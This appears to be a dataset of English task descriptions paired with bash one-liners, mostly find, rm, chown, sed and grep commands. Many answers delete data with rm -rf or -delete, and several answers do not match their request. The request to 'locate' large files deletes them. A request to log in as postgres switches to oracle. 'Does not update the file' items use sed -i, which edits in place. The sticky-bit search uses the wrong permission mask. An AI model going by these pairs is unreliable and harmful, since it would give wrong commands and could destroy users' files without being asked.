{"input": "find and image in current folder (case insensitive search)", "answer": "find . -iname \"Articles.jpg\""}
{"input": "find any files in the current directory that begin with a number", "answer": "find . -regex './[0-9].*' -print"}
{"input": "find any files or directories called \".svn\" under the current directory and run a recursive delete (without prompting) command on each one", "answer": "find . -iname .svn -exec bash -c 'rm -rf {}' \\;"}
{"input": "find case-insentive example.com file, and whole dose not contain beta", "answer": "find -iname example.com | grep -v beta"}
{"input": "find case-insentive example.com file, omit ./beta path", "answer": "find ./ -path ./beta/* -prune -o -iname example.com -print"}
{"input": "find dirctory files which modification time is  7 days ago", "answer": "find . -mtime -7 -type d"}
{"input": "find directories in the folder /usr/spool/uucp", "answer": "find /usr/spool/uucp -type d -print"}
{"input": "find directories under the $LOGDIR directory where there has been no modifications within the last 24 hours and compresses the files", "answer": "find $LOGDIR -type d -mtime +0 -exec compress -r {} \\;"}
{"input": "find directories under the $LOGDIR directory where there have been no modifications for 5 days and deletes them", "answer": "find $LOGDIR -type d -mtime +5 -exec rm -f {} \\;"}
{"input": "find file which name like 'foo.*' in current directory", "answer": "find . -name \"foo.*\""}
{"input": "find for a filename with multiple patterns in the current folder", "answer": "find . -name \"photo*.jpg\""}
{"input": "find for a word in all the regular files in the current directory", "answer": "find . -type f -exec grep -li '/bin/ksh' {} \\;"}
{"input": "find for the word \"dba_2pc_pending\" in all the files of current fodler having the word \"sql\" in their name", "answer": "find . -print|grep sql|xargs grep -i dba_2pc_pending"}
{"input": "find for xml files in current folder using regular expressions", "answer": "find ./ -regex \"cmn-.*[\\x4e00-\\x9fa5]*\\.xml\""}
{"input": "find in $HOME files ending in \"txt\" and do nothing with them, or files ending in \"html\" and list them null separated", "answer": "find $HOME -name \\*txt -o -name \\*html -print0"}
{"input": "find in the entire file system for the file mysql", "answer": "sudo find / -name mysql -print"}
{"input": "find in the entire file system for the files which have sticky bit", "answer": "find / -perm 0551"}
{"input": "find in the file system for the directories with the name \"httpdocs\"", "answer": "find / -type d -name 'httpdocs'"}
{"input": "find list of all files with file permission , link , owner , group , reation time , size , file name", "answer": "find . -exec ls -ld {} \\;"}
{"input": "find md5sum of 'string to be hashed'", "answer": "echo 'string to be hashed' | md5"}
{"input": "find md5sum of an empty string", "answer": "echo -n '' | md5"}
{"input": "find md5sum of content from \"www.google.com\"", "answer": "curl -s www.google.com | md5"}
{"input": "find md5sum of string 'hi'", "answer": "echo -n hi | md5"}
{"input": "find non-hidden files (ones that do not start with the period \".\" chartacter) that were are modified in the last 15 minutes", "answer": "find . -mmin -15 \\( ! -regex \".*/\\..*\" \\)"}
{"input": "find not case sensitive all directories that names are 'apt' and display details", "answer": "find  / -type d -iname \"apt\" -ls"}
{"input": "find out what group a given user has", "answer": "groups user"}
{"input": "find regular file named foo.txt under root / directory", "answer": "find / -name foo.txt -type f -print"}
{"input": "find regular files and directories that have been modified in the last seven days", "answer": "find . -mtime -7 -type f"}
{"input": "find regular files in the \"mail\" folder under the user's home directory, displaying filenames and lines that contain the text \"Linux\"", "answer": "find ~/mail -type f | xargs grep \"Linux\""}
{"input": "find regular files under the current directory and execute an md5sum command on each one", "answer": "find -type f -exec md5sum {} +"}
{"input": "find regular files under the current directory, whose name ends in .mbox and rename each file, to the same name without .mbox at the end", "answer": "find . -type f -wholename \\*.mbox | sed 's/\\(.*\\)\\.mbox/mv \"\\1.mbox\" \"\\1\"/' | sh"}
{"input": "find regular files under the current directory, whose name ends in .mbox and using awk run multiple system commands to rename each matched file, to the same name without .mbox at the end", "answer": "find . -wholename \\*.mbox | awk '{new=$0; gsub(\"\\.mbox$\", \"\", new) ; system(\"mv \\\"\" $0 \"\\\" \\\"\" new \"\\\"\") }'"}
{"input": "find regular/normal files in the current folder", "answer": "find -type f"}
{"input": "find setuid files and directories writing the details to /root/suid.txt , and find large files writing the details to /root/big.txt, traversing the filesystem just once", "answer": "find / \\( -perm -4000 -fprintf /root/suid.txt '%#m %u %p\\n' \\) , \\  \\( -size +100M -fprintf /root/big.txt '%-10s %p\\n' \\)"}
{"input": "find suffix tcl files under all directories started with 'n'", "answer": "find ./n* -name \"*.tcl\""}
{"input": "find symbolic links with pattern` '*sysdep.c'", "answer": "find . -lname '*sysdep.c'"}
{"input": "find the MyCProgram.c (case insensitive find) under the current directory and run the md5sum command against it", "answer": "find -iname \"MyCProgram.c\" -exec md5sum {} \\;"}
{"input": "find the biggest files only (but not directories)", "answer": "find . -type f -exec du -Sh {} + | sort -rh | head -n 15"}
{"input": "find the count of all the charcters of the list of regular files present in the current folder", "answer": "find . -type f | xargs | wc -c"}
{"input": "find the count of all the regular files in a directory", "answer": "find /usr -type f | wc -l"}
{"input": "find the count of text files that are present in the current working directory", "answer": "find . -maxdepth 1 -name \\*.txt -print0 | grep -cz ."}
{"input": "find the depth of all the files in current folder and display the depth and file name", "answer": "find folder1/ -depth -type f -printf \"%d\\t%p\\n\""}
{"input": "find the file \"MyCProgram.c\" in the current folder", "answer": "find -iname \"MyCProgram.c\""}
{"input": "find the file \"dateiname\" in the current folder ( case insensitive search)", "answer": "find -iname \"Dateiname\""}
{"input": "find the file \"dateiname\" in the entire file system ( case insensitive search)", "answer": "find / -iname \"Dateiname\""}
{"input": "find the file \"filename.txt\" in the entire file system", "answer": "find / -name filename.txt -print"}
{"input": "find the file \"filename.txt\" in the usr folder", "answer": "find /usr -name filename.txt -print"}
{"input": "find the file \"foo.txt\" in the current folder and assign the output to a variable", "answer": "OUTPUT=`find . -name foo.txt`"}
{"input": "find the file \"httpd.log\" in the entire file system", "answer": "find / -type f -name httpd.log"}
{"input": "find the file \"myfile.txt\" in the folder /home/user/myusername/", "answer": "find /home/user/myusername/ -name myfile.txt -print"}
{"input": "find the file arrow.jpg in the entire file system", "answer": "find / -name arrow.jpg"}
{"input": "find the file with inode $inum under the current directory and delete it", "answer": "find . -inum $inum -exec rm {} \\;"}
{"input": "find the file with the name \"esxcfg-firewall\" in the current folder", "answer": "find -print | grep esxcfg-firewall"}
{"input": "find the md5 sum of all the regular files in multiple folders and display them in sorted order", "answer": "find teste1 teste2 -type f -exec md5 -r {} \\; | sort"}
{"input": "find the most recently changed files under current directory", "answer": "find . -type f -printf '%TY-%Tm-%Td %TT   %p\\n' | sort"}
{"input": "find the oldest normal file in the current directory", "answer": "find -type f -printf '%T+ %p\\n' | sort | head -n 1"}
{"input": "find the oldest normal file in the current directory and display its contents", "answer": "find -type f -printf \"%T+ %p\\0\" | sort -z | grep -zom 1 \".*\" | cat"}
{"input": "find the oldest normal file in the current directory and display with its timestamp", "answer": "find ! -type d -printf \"%T@ %p\\n\" | sort -n | head -n1"}
{"input": "find the path of a specfic video file in the current directory", "answer": "find . -name foo.mp4 | sed 's|/[^/]*$||'"}
{"input": "find the regular/normal file \"myfile\" in the folder /root", "answer": "find /root/ -name myfile -type f"}
{"input": "find the ten biggest files", "answer": "find /home -type f -exec du -s {} \\; | sort -r -k1,1n | head"}
{"input": "find the top 25 files in the current directory and its subdirectories", "answer": "find . -type f -exec ls -al {} \\; | sort -nr -k5 | head -n 25"}
{"input": "find the type & description of all the regular/normal files in the home folder", "answer": "find /home -type f -print0 | xargs -0 file"}
{"input": "find the type of all the regular/normal files in the current folder", "answer": "find . -type f -exec file {} \\;"}
{"input": "find the type of all the regular/normal files in the current folder (plus takes bulk of files as input to the file command)", "answer": "find . -type f -exec file {} \\+;"}
{"input": "finda all the hidden files excluding those having the extension htaccess", "answer": "find . -type f \\( -iname \".*\" ! -iname \".htaccess\" \\)"}
{"input": "finda ll the files in the current folder that are modified today", "answer": "find ~ -type f -mtime 0 -ls"}
{"input": "finds all directories named CVS, and deletes them and their contents", "answer": "find . -type d -name CVS -exec rm -r {} \\;"}
{"input": "finds all files modified within a certain time frame recursively", "answer": "find . -type f -newermt \"2013-06-01\" \\! -newermt \"2013-06-20\""}
{"input": "force delete all the core files in the home folder", "answer": "find $HOME -name core -exec rm -f {} \\;"}
{"input": "force delete all the directories the folder \"test folder\"", "answer": "find 'Test Folder' -type d -print0 | xargs -0 rm -rf"}
{"input": "force delete all the files in the current folder expect xml files", "answer": "find . | grep -v xml | xargs rm -rf {}"}
{"input": "force delete all the files that have been modified in the last 3 days", "answer": "find . -mtime -3 -exec rm -rf {} \\;"}
{"input": "force delete all the files which have not been accessed in the last 240 hours in the temp folder", "answer": "find /tmp/* -atime +10 -exec rm -f {} \\;"}
{"input": "force delete all the regular files with the name \"test.txt\"", "answer": "find /home -type f -name test.txt -exec rm -f {} \\"}
{"input": "force delete all the regular/normal files in the current folder", "answer": "find . -type f -exec rm -fv {} \\;"}
{"input": "force delete all the temp files which are of size 0 bytes and which have not been accessed in the last 10 days", "answer": "find /tmp -size 0 -atime +10 -exec rm -f {} \\;"}
{"input": "force remove all the c files in the current folder, print0 is used to handle all files with new lines in their names or files with only spaces in their name", "answer": "find . -name \"*.c\" -print0 | xargs -0 rm -rf"}
{"input": "force remove all the directories with the name logs in the folder /var/www", "answer": "find /var/www -type d -mtime 0 -name logs -exec sudo rm -fr {} \\;"}
{"input": "force remove all the regular/normal files which begin with sess in the temp folder", "answer": "find /tmp -type f -name sess* -exec rm -f {} \\;"}
{"input": "force remove all the text files that have not been modified in the last 89 days", "answer": "find .  -name \"*.txt\" -type f -daystart -mtime +89 | xargs rm -f"}
{"input": "forcibly and verbosely create a symbolic link named \"target\" to file \"source\"", "answer": "ln -sfvn source target"}
{"input": "forcibly and verbosely create symbolic links in directory \"~/Library/LaunchAgents\" to all files located in /usr/local/opt/mongodb/ and that have filename extension \".plist\"", "answer": "ln -sfv /usr/local/opt/mongodb/*.plist ~/Library/LaunchAgents"}
{"input": "forcibly change owner to all files and directories in current directory to user www-data", "answer": "sudo chown -Rf www-data *"}
{"input": "get a PID of a process", "answer": "jobs -x echo %1"}
{"input": "get a PID of a process with name 'test.sh &'", "answer": "jobs -l | grep 'test.sh &' | grep -v grep | awk '{print $2}'"}
{"input": "get all files in a current directory modified in the last 7 days", "answer": "find . -mtime -7 -print0 | xargs -0 tar -cjf /foo/archive.tar.bz2"}
{"input": "get md5sum of an iso file without displaying the filename, save value to 'md5' variable", "answer": "md5=`md5sum ${my_iso_file} | awk '{ print $1 }'`"}
{"input": "get second-to-last comma-separated field of each line in file.txt", "answer": "cat file.txt | rev | cut -d ',' -f 2 | rev"}
{"input": "get the count of all the files that have been accessed in the last 30 days", "answer": "find . -atime +30 -exec ls \\; | wc -l"}
{"input": "get the git user access", "answer": "su git"}
{"input": "get year-month-day hour:minute:second from date", "answer": "date +%Y-%m-%d:%H:%M:%S"}
{"input": "gives the chars in line 5 and chars 5 to 8 of line 5, in tst.txt", "answer": "head -5 tst.txt | tail -1 |cut -c 5-8"}
{"input": "grep for the last occurrence of text between two tags", "answer": "tac a | grep -m1 -oP '(?<=tag>).*(?=</tag>)'"}
{"input": "grep from bottom of file", "answer": "tac your.log | grep stuff"}
{"input": "insert \"e\" when it's pressed", "answer": "bind '\"e\":self-insert'"}
{"input": "keep only read access to all the files in a directory", "answer": "find /path/to/dir ! -perm 0644 -exec chmod 0644 {} \\;"}
{"input": "kill a number of background jobs", "answer": "jobs -p | tail -n [number of jobs] | xargs kill"}
{"input": "kill all background processes", "answer": "kill -INT $(jobs -p)"}
{"input": "kill group leader", "answer": "kill `jobs -lp`"}
{"input": "lines.txt contains a list of line numbers, one entry per line - output only these lines from text.txt omitting the rest of the file", "answer": "cat -n text.txt | join -o2.2 lines.txt -"}
{"input": "list *.bmp and *.txt files under the /home/user/Desktop directory", "answer": "find /home/user/Desktop -name '*.bmp' -o -name '*.txt'"}
{"input": "list *.pdf files under the /home/user/Desktop directory", "answer": "find /home/user/Desktop -name '*.pdf'"}
{"input": "list *.pdf, *.bmp and *.txt files under the /home/user/Desktop directory", "answer": "find /home/user/Desktop -name '*.pdf' -o -name '*.txt' -o -name '*.bmp'"}
{"input": "list PID of a group leader", "answer": "jobs -lp"}
{"input": "list all *.txt files in the user's home directory", "answer": "find ~/ -name '*.txt'"}
{"input": "list all java file that StringBuff in context", "answer": "find . -type f -name \"*.java\" -exec grep -l StringBuffer {} \\;"}
{"input": "list all javascipts file expect files under proc folder", "answer": "find . -type d -name proc -prune -o -name '*.js'"}
{"input": "list all javascipts file which whole name does not contain \"directory\"", "answer": "find . -name '*.js' -and -not -path directory"}
{"input": "list all javascipts file which whole name does not contain excludeddir", "answer": "find . -name '*.js' | grep -v excludeddir"}
{"input": "list all javascipts file which whole name does not contain excludeddir or excludedir2  or excludedir3", "answer": "find . -name '*.js' | grep -v excludeddir | grep -v excludedir2 | grep -v excludedir3"}
{"input": "list all js files under currect directory exculde the directory which path contain \"/path/to/search/exclude_me\" or name isexclude_me_too_anywhere", "answer": "find /path/to/search                    \\   -type d                               \\     \\( -path /path/to/search/exclude_me \\        -o                               \\        -name exclude_me_too_anywhere    \\      \\)                                 \\     -prune                              \\   -o                                    \\   -type f -name '*\\.js' -print"}
{"input": "list all regular files which path is not dir1 or dir2", "answer": "find ! -path \"dir1\" ! -path \"dir2\" -type f"}
{"input": "list all samba files in /var/l* directory ( /var/lib or /var/log )", "answer": "find  /var -path */l??/samba*"}
{"input": "list any files modified since /bin/sh was last modified", "answer": "find . -newer /bin/sh"}
{"input": "list broken symbolic links under \"somedir\"", "answer": "find \"somedir\" -type l -print0 | xargs -r0 file | grep \"broken symbolic\" | sed -e 's/^\\|: *broken symbolic.*$/\"/g'"}
{"input": "list complete path name to process associated with pid \"$1\"", "answer": "find /proc/$1/exe -printf '%l\\n'"}
{"input": "list files found under the current directory ending in \"txt\" or ending in \"html\"", "answer": "find . -name '*.txt' -o -name '*.html'"}
{"input": "list files in /usr modified after February 1 of the current year", "answer": "find /usr -newermt \"Feb 1\""}
{"input": "list files in /usr modified after the time which /tmp/stamp$$ modified", "answer": "find /usr -newer /tmp/stamp$$"}
{"input": "list files that the user does not have permissions to read, do not try to descend into directories that cannot be read", "answer": "find . ! -perm -g+r,u+r,o+r -prune"}
{"input": "list in long format all files from / whose filename ends in \"jbd\", not descending into directories that are not readable while searching, and not descending into directories on other filesystems", "answer": "find / -mount \\! -readable -prune  -o  -path /dev -prune  -o  -name '*.jbd' -ls"}
{"input": "list in long format all files from / whose filename ends in \"jbd\", not descending into directories that are not readable while searching", "answer": "find / \\! -readable -prune -o -name '*.jbd' -ls"}
{"input": "list regular file which file name end with '*.c' or '*.sh' in current directory", "answer": "find . -type f \\( -name \"*.c\" -o -name \"*.sh\" \\)"}
{"input": "list regular file which file name end with 'cache' 'xml' or 'html' in current directory", "answer": "find . -type f \\( -name \"*cache\" -o -name \"*xml\" -o -name \"*html\" \\)"}
{"input": "list regular file which file name is NOT end with '.html' in current directory in current directory", "answer": "find . -type f -not -name \"*.html\""}
{"input": "list regular files ending in .mbox", "answer": "find . -type f -wholename \\*.mbox"}
{"input": "list regular files under the current directory", "answer": "find . -type f"}
{"input": "list regular files under the current directory ending in .mbox putting a null between each file found", "answer": "find . -type f -wholename \\*.mbox -print0"}
{"input": "list regular files under the user's home directory that are over 100KB and have not been accessed in over 30 days", "answer": "find $HOME -type f -atime +30 -size 100k"}
{"input": "list symbolic links under the directory \"$directory\" using contents of the $IFS variable between output of each one", "answer": "find $directory -type l -printf \"%p$IFS\""}
{"input": "list the details of all the directories in the current folder", "answer": "find . -type d -exec ls -ld {} \\;"}
{"input": "list the files with a name ending with '.mp3' or '.jpg' and beginning with 'foo'", "answer": "find . \\( -name '*.mp3' -o -name '*.jpg' \\) -name 'foo*' -print"}
{"input": "list the regular files in your home directory that were modified yesterday", "answer": "find ~/ -daystart -type f -mtime 1"}
{"input": "list txt files older than 5 days or html files of any age, null separated", "answer": "find . \\( -name '*.txt'  -mtime +5 -o -name '*.html' \\) -print0"}
{"input": "locate large files (> 100 MB) in /home/ for 'cleaning'", "answer": "find /home -type f -size +100M -delete"}
{"input": "login as user postgres", "answer": "sudo su -l oracle"}
{"input": "modify the permissions of all the folders in a directory", "answer": "find /path/to/dir -type d -exec chmod 755 {} \\;"}
{"input": "move all files in the current folder another folder and do not move the files in the sub folder", "answer": "find . -name \"*\" -maxdepth 1 -exec mv -t /home/foo2/bulk2 {} +"}
{"input": "move all the files in the current folder  to temp folder and search atleast in one subfolder", "answer": "find . -mindepth 1 -exec mv -t /tmp {} +"}
{"input": "move all the html files from current folder to another folder and if a symbolic link is found copy the original referenced file and not the link", "answer": "find . -follow -iname '*.htm' -print0 | xargs -i -0 mv '{}' ~/webhome"}
{"input": "only get md5sum of a file", "answer": "md5 -q file"}
{"input": "perform a case insensitive search", "answer": "find  / -type d -iname \"apt\" -ls"}
{"input": "prevents curl from returning error (23) Failed writing body when grepping for foo", "answer": "curl \"url\" | tac | tac | grep -qs foo"}
{"input": "print apparent size rather than disk usage", "answer": "du -B1 --apparent-size /tmp/foo.txt"}
{"input": "print lines from last match of ^Statistics until end of file", "answer": "tac INPUTFILE | sed '/^Statistics |/q' | tac"}
{"input": "prints a line 19 lines from the line containing PATTERN", "answer": "tac | sed -n '/PATTERN/,+19{h;d};x;/^$/!{p;s/.*//};x' | tac"}
{"input": "prints a number stored among text in $filename", "answer": "echo $filename | egrep -o '[[:digit:]]{5}' | head -n1"}
{"input": "prints absolute file paths for files in current directory", "answer": "find `pwd` -maxdepth 1"}
{"input": "prints last part of a logfile since timestamp 423", "answer": "tac file.log | awk '{ if ($1 >= 423) print; else exit; }' | tac"}
{"input": "prints the names of all files in the directory tree rooted in /usr/src whose name ends with '.c' and that are larger than 100 Kilobytes", "answer": "find /usr/src -name '*.c' -size +100k -print"}
{"input": "prints top 10 commands used", "answer": "history | awk '{print $2}' | awk 'BEGIN {FS=\"|\"}{print $1}' | sort | uniq -c | sort -nr | head"}
{"input": "recursively change owner and group of the directory and all files into it to user \"user\" and group \"www-data\"", "answer": "chown -R user:www-data yourprojectfoldername"}
{"input": "recursively change owner and group of the directory and all files into it to user root and group root", "answer": "chown -R root:root /var/lib/jenkins"}
{"input": "recursively change owner and group of the directory and group of the directory and all files into it to user and group dev_user", "answer": "chown \"dev_user\".\"dev_user\" -R ~/.ssh/"}
{"input": "recursively change owner of the directory /Users/xxx/Library/Developer/Xcode/Templates and all files to user xxx", "answer": "sudo chown -R xxx /Users/xxx/Library/Developer/Xcode/Templates"}
{"input": "recursively change owner of the directory /tmp to the current user", "answer": "sudo chown -R $USER ~/tmp"}
{"input": "recursively change owner of the directory /usr/local to the current user", "answer": "sudo chown -R `whoami` /usr/local"}
{"input": "recursively change owner of the directory /usr/local/lib to the current user", "answer": "sudo chown -R `whoami` /usr/local/lib"}
{"input": "recursively change owner of the directory /usr/local/lib/node_modules/ to the current user", "answer": "sudo chown -R $USER /usr/local/lib/node_modules"}
{"input": "recursively change owner of the directory and all files into it to user  nobody", "answer": "chown -R nobody upload_directory"}
{"input": "recursively change owner of the directory ~/.npm to the current user", "answer": "sudo chown -R $(whoami) ~/.npm"}
{"input": "recursively change user of the direct public_html and all files into it to user owner", "answer": "chown -R owner:owner public_html"}
{"input": "recursively finds all files newer than a date", "answer": "find . -type f -newermt \"$(date '+%Y-%m-%d %H:%M:%S' -d @1494500000)\""}
{"input": "recursively look for files ending in either .py or .py.server", "answer": "find . -type f -regex \".*\\.\\(py\\|py\\.server\\)\""}
{"input": "remote copy all text files from one location to another", "answer": "find .  -name '*.txt' -exec rsync -R {} path/to/dext \\;"}
{"input": "remove all \"Foo*\" files under current dir", "answer": "find . -type f -name \"Foo*\" -exec rm {} \\;"}
{"input": "remove all core dump files from user's home directory", "answer": "find ~/ -name 'core*' -exec rm {} \\;"}
{"input": "remove all core files in the file system", "answer": "find / -name \"*.core\" -print -exec rm {} \\;"}
{"input": "remove all subdirectories named \"CVS\" under current dir", "answer": "find . -type d -name CVS -exec rm -r {} \\;"}
{"input": "remove all text files from the current folder", "answer": "find -name \"*.txt\" | xargs rm"}
{"input": "remove all text files from the current folder. Print0 is used to handle files whose names have only spaces or those files which have newlines in their names", "answer": "find -name \"*.txt\" -print0 | xargs -0 rm"}
{"input": "remove all the \".core\" files in the file system", "answer": "find / -name \"*.core\" -print -exec rm {} \\;"}
{"input": "remove all the \"core\" files in the current folder which have not been changed in the last 4 days", "answer": "find . -name core -ctime +4 -exec /bin/rm -f {} \\;"}
{"input": "remove all the core files from /usr folder which have not been accessed in the last 7*24 hours", "answer": "find /usr -name core -atime +7 -exec rm \"{}\" \\;"}
{"input": "remove all the core files in the current directory", "answer": "/bin/find -name \"core\" \u2014 exec rm {} \\;"}
{"input": "remove all the core files in the home folder", "answer": "find /home -name core -exec rm {} \\;"}
{"input": "remove all the core files in the temp file after user confirmation", "answer": "find /tmp -name core -type f -print0 | xargs -0 /bin/rm -i"}
{"input": "remove all the files in current folder which have the extension \"DS_Store\"", "answer": "find . -name \".DS_Store\" -exec rm {} \\;"}
{"input": "remove all the files in the current folder which have not been changed in the last 30*24 hours", "answer": "find ./ -ctime +30 -type f -exec rm -f {} \\;"}
{"input": "remove all the files in the current folder which have not been modified in the last 10 days", "answer": "find . -mtime +10 | xargs rm"}
{"input": "remove all the files in the current working directory which have a specifc inode number", "answer": "find . -inum $inum -exec rm {} \\;"}
{"input": "remove all the files in the present directory which have space in their name", "answer": "find . -name \"* *\" -exec rm -f {} \\;"}
{"input": "remove all the files in the present directory which have special characters in their name and do not search in the sub directories of the current folder", "answer": "find . -name '*[+{;\"\\\\=?~()<>&*|$ ]*' -maxdepth 0 -exec rm -f '{}' \\;"}
{"input": "remove all the files with the name \"Trash\" in the folder /home", "answer": "find /home -name Trash -exec rm {} \\;"}
{"input": "remove all the log files which have not been modified in the last 5 days", "answer": "find /logs -type f -mtime +5 -exec rm {} \\;"}
{"input": "remove all the pdf files in the current folder and do not delete those in the sub folders", "answer": "find . -name \"*.pdf\" -maxdepth 1 -print0 | xargs -0 rm"}
{"input": "remove all the permissions for others to all the files in the current folder which have  read,write,execute access to users,group and others", "answer": "find * -perm 777 -exec chmod 770 {} \\;"}
{"input": "remove top-level domain (.com, .org) from URL's in urllist.txt", "answer": "rev urllist.txt | cut -d. -f 2- | rev"}
{"input": "removes last N lines from file.txt", "answer": "head --lines=-N file.txt"}
{"input": "removes the 4th-from to 6th-from last lines in file", "answer": "tac filename | sed 4,6d | tac"}
{"input": "rename all the png files to jpg files in the current fodler", "answer": "find . -name \"*.png\" -print0 | sed 'p;s/\\.png/\\.jpg/' | xargs -0 -n2 mv"}
{"input": "rename all the svg.png files to png files in the current fodler", "answer": "find . -name \"*.svg.png\" -print0 | sed 's/.svg.png//g' | xargs -0 -I namePrefix mv namePrefix.svg.png namePrefix.png"}
{"input": "rename all the text files  in the current folder to html files", "answer": "find -name \"*.txt\" -exec mv {} `basename {} .htm`.html \\;"}
{"input": "renames all \".htm\" files to \".html\" files", "answer": "find . -name \"*.htm\" -exec mv '{}' '{}l' \\;"}
{"input": "replace a word in all the regular/normal files in the current folder(doesn't actually modify the original file just displays the replaced text)", "answer": "find . -type f -print0 | xargs -0 sed -i 's/Application/whatever/g'"}
{"input": "replace the word apple with orange in all the files in the current folder", "answer": "find ./ -exec sed -i 's/apple/orange/g' {} \\;"}
{"input": "replace the word apple with orange in all the regular/normal files in the current folder", "answer": "find ./ -type f -exec sed -i -e 's/apple/orange/g' {} \\;"}
{"input": "replace the word foo to bar in all the regular/normal files in the current folder (does not update the file)", "answer": "find . -type f -exec sed -i 's/foo/bar/g' {} +"}
{"input": "replace the word foo to bar in the current folder in all the regular/normal files containing the word \"baz\" in their name (does not update the file)", "answer": "find . -type f -name \"*baz*\" -exec sed -i 's/foo/bar/g' {} +"}
{"input": "replaces the last occurrence of 'a' with 'c'", "answer": "tac infile.txt | sed \"s/a/c/; ta ; b ; :a ; N ; ba\" | tac"}
{"input": "replaces the last occurrence of 'a' with 'c' in file", "answer": "tac file | awk '/a/ && !seen {sub(/a/, \"c\"); seen=1} 1' | tac"}
{"input": "replaces the second to last line of file", "answer": "tac file | sed '2 s/,$//' | tac"}
{"input": "return every file that does not have bar somewhere in its full pathname", "answer": "find . ! -path '*bar*' -print"}
{"input": "returns a list of  files create time is 1 minute ago under the root directory", "answer": "find / -newerct '1 minute ago' -print"}
{"input": "returns a list of  files modification newer than poop", "answer": "find . -mnewer poop"}
{"input": "returns the first 100 bytes in the file", "answer": "head -c 100 file"}
{"input": "reverse both words and lines in file", "answer": "tac filename | awk '{for (i=NF; i>1; i--) printf(\"%s \",$i); printf(\"%s\\n\",$1)}'"}
{"input": "reverse input with comma deliminators", "answer": "echo \"a,b,c\" | tr '\\n' ',' | tac -s \",\" | sed 's/,$/\\n/'"}
{"input": "same as above example with -exec , in this example with -OK it should ask for confirmation before executing the rm command . that is called user intractive command", "answer": "find . -name core -ok rm {} \\;"}
{"input": "search  in current directory downwards all files which were accessed exactly 7 days back", "answer": "find . -atime 7 -print"}
{"input": "search  in current directory downwards all files whose status has changed more then 7  days ago", "answer": "find .  -ctime +7 -print"}
{"input": "search  in root  ( / ) directory downwards all files which have less than 2 links", "answer": "find / -links -2 -print"}
{"input": "search  in root ( / ) directory downwards all files which  have exactly 2 links", "answer": "find /  -links 2 -print"}
{"input": "search a url in all regular/normal files in a folder", "answer": "find ./ -type f -exec grep https://www.ksknet.net {} \\;"}
{"input": "search all files in the current folder which match the regular expression", "answer": "find . -regex \".*/my.*p.$\" -a -not -regex \".*test.*\""}
{"input": "search all jpg files in current folder", "answer": "find . -type f -name \"*.jpg\""}
{"input": "search all jpg images in current folder and rename them", "answer": "find . -type f -name \"*.jpg\" -print0 | xargs -0 rename \"s/Image_200x200_(\\d{3})/img/\""}
{"input": "search all mp3 files in the folder \"/home/you\" which have been modified yesterday (from the start of day 00:00 to 23:59)", "answer": "find /home/you -iname \"*.mp3\" -daystart -type f -mtime 1"}
{"input": "search all the \".sh\" files in the /usr folder and follow the symbolic links to their original file", "answer": "find /usr -follow -name '*.sh'"}
{"input": "search all the files in the current folder and assign them to a variable", "answer": "files=`find .`"}
{"input": "search all the files in the current folder excluding those that are present in the folder test and using regex", "answer": "find . -name test -prune -regex \".*/my.*p.$\""}
{"input": "search all the files in the current folder using name patterns", "answer": "find . -name 'a(b*' -print"}
{"input": "search all the files in the current folder using regex", "answer": "find . -regex \".*/my.*p.$\""}
{"input": "search all the files in the current folder using regex excluding those that are present in the folder test", "answer": "find . -name test -prune -o -regex \".*/my.*p.$\""}
{"input": "search all the files in the folder \"myfiles\" which have the word \"blue\" in their name", "answer": "find /myfiles -name '*blue*'"}
{"input": "search all the lines that start with the word malloc in the files ending with .c or .h or .ch", "answer": "grep ^malloc `find src/ -name '*.[ch]'`"}
{"input": "search files  in the file system excluding those in the paths \"10_Recommended\" and \"/export/repo\"", "answer": "find / -name whatever -not -path \"/10_Recommended*\" -not -path \"/export/repo/*\""}
{"input": "search files in current folder using name patterns", "answer": "find . -name \"$pattern\""}
{"input": "search files in the folder /home which have been modified after /tmp/after and before /tmp/before", "answer": "find /home/ -type f -newer /tmp/after -not -newer /tmp/before"}
{"input": "search for \"flac\" files in current folder using regular expressions", "answer": "find ./ -regex \"./cmn-.\\.flac\""}
{"input": "search for \"message.txt\" in the folder .cache/bower and display its contents", "answer": "find .cache/bower/ -name \"message.txt\" | xargs cat"}
{"input": "search for \"some_function\" in all the python files in the current directory", "answer": "find . -name \\*.py | xargs grep some_function"}
{"input": "search for \"specified string\" in all the php files in the current folder", "answer": "find . -name '*.[php|PHP]' -print | xargs grep -HnT 'specified string'"}
{"input": "search for MP3 files in the current folder and subfolders except in dir1 subfolder", "answer": "find ! -path \"dir1\" -iname \"*.mp3\""}
{"input": "search for MP3 files in the current folder and subfolders exclude dir1 AND dir2", "answer": "find ! -path \"dir1\" ! -path \"dir2\" -iname \"*.mp3\""}
{"input": "search for a cpp directory in current folder and display all its files", "answer": "find . -type d -name \"cpp\" -exec find {} -type f \\;"}
{"input": "search for a file \"file\" in current folder and display all instances of this file", "answer": "find -name file -print"}
{"input": "search for a file \"file\" in current folder and if the file is found quit !", "answer": "find -name file -quit"}
{"input": "search for a files \"cart1\" in the folder junk which is in home folder and move the folder to ~/junk/A", "answer": "find ~/junk  -name 'cart1' -exec mv {} ~/junk/A \\;"}
{"input": "search for a function in all python files in the current folder", "answer": "find . -name '*.py' | xargs grep some_function"}
{"input": "search for a regular/normal file \"myfile\" in the entire file system excluding the folder in excluded_path", "answer": "find / -path excluded_path -prune -o -type f -name myfile -print"}
{"input": "search for a shell script in the current folder and display the current folder path", "answer": "find . -name onlyme.sh -exec pwd \\;"}
{"input": "search for a shell script in the current folder and display the current folder path but search from the sub directories", "answer": "find . -name onlyme.sh -execdir pwd \\;"}
{"input": "search for a word in all c files in the current folder", "answer": "find . -name '*.c' | xargs grep 'stdlib.h'"}
{"input": "search for a word in all files in a directory", "answer": "find /directory/containing/files -type f -print0 | xargs -0 grep \"test to search\""}
{"input": "search for a word in all the .C files in the current directory", "answer": "find . -name \"*.c\" -exec grep -ir \"keyword\" {} \";\""}
{"input": "search for a word in all the .C files( those having the extension \"c\") in current directory", "answer": "find . -type f \\( -iname '*.c' \\) |grep -i -r 'keyword'"}
{"input": "search for a word in all the fies in the current folder", "answer": "find . -type f -exec grep some_string {} \\;"}
{"input": "search for a word in all the files in the current directory", "answer": "find . -exec grep chrome {} +"}
{"input": "search for a word in all the files in the current directory (case insensitive search)", "answer": "find . -type f -exec grep 'needle' {} \\;"}
{"input": "search for a word in all the files in the current directory and display the file paths relative to the current directory", "answer": "find . -exec grep -l foo {} +"}
{"input": "search for a word in all the files in the current directory and display the list of matched files", "answer": "find . -type f -exec grep -l 'needle' {} \\;"}
{"input": "search for a word in all the files in the entire filesystem and display the matched fline along with the file name", "answer": "find / -type f -exec grep -Hi 'the brown dog' {} +"}
